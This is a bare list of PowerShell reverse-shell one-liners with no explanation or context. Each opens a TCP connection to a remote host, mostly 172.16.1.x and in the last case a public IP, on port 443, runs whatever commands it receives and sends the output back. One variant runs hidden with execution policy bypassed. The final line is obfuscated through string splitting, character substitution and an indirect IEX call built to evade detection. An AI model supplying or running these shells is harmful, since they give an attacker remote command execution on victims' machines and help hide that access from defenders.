$client = New-Object System.Net.Sockets.TCPClient("172.16.1.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -Exec "& {$ps=$false;$hostip=(gci -path env:172.16.1.2).value;$port=(gci -path env:443).value;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='172.16.1.3';$port=443;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

& {$ps=$false;$hostip='172.16.1.2';$port=443;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}

(('& {8Ypps=8Ypfalse;8Yphostip=Y'+'bC3.14.163.33YbC;8Ypport=443;8Ypc'+'lient = New-Object System.Net.Sock'+'ets.TCPClient('+'8Yphostip,8Ypport);8Ypstream = 8Ypclient.GetStream'+'();[byte[]]8'+'Ypbytes = 0..500003bm%{0};while((8Ypi = 8Ypstream.Read(8Ypbytes, 0, 8Ypbytes.L'+'ength'+')) -ne 0){8Ypdata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(8Ypbytes,0, 8Ypi);8Ypcmd=(get-chil'+'ditem Env:ComSpec).value;8YpinA'+'rray=8Ypdata.split();8Ypitem=8YpinArray[0];if((8Ypite'+'m -eq YbC8YppsYbC) -and (8Ypps -eq 8Ypf'+'alse)){8Ypp'+'s=8Yptr'+'ue}if(8Ypitem '+'-like YbC?:YbC){8Ypi'+'tem=YbCd'+':YbC}8YpmyArray=@(Yb'+'CcdYbC,YbCexitYb'+'C,YbCd:YbC,YbCpwdY'+'bC,YbClsYbC,YbCpsYbC,YbCrmYb'+'C,YbCcpYbC,YbCmvYbC,YbCcatY'+'bC);8Y'+'pdo=8Ypfalse;foreach (8Ypi in 8YpmyArray){if(8Ypitem -eq'+' 8Ypi){8Ypdo=8Yptrue}}if(8Ypdo -or 8Ypps){8Ypsendback=( iex 8Yp'+'data 2>&'+'1 3bmO'+'ut-String)}else{8'+'Ypdata2=YbC/c YbC+8Ypdata;8Ypsendback = ( &8Ypc'+'md 8Ypdata2 2>&1 3bm Out-Str'+'ing)};if('+'8Ypps){8Ypprompt=YbCPS YbC + (pwd).Path}else{8Ypprompt=(pwd).Path}8Ypsendback2 = 8Ypdata + '+'8Ypsendback + 8Ypprompt + YbC> YbC;8Y'+'psendbyte = ([text.encoding]::ASCII).GetBytes(8Ypsendback2);'+'8Ypstream.Write(8Ypsendbyte,0,8Ypsendbyte.Length);8Ypstream.Flus'+'h()};8Ypclient.Close()}')  -CrEplAcE '3bm',[chAR]124  -CrEplAcE([chAR]56+[chAR]89+[chAR]112),[chAR]36  -RePlacE 'YbC',[chAR]39)|&( $veRbosePrEFEreNCE.TOsTriNg()[1,3]+'X'-jOin'')
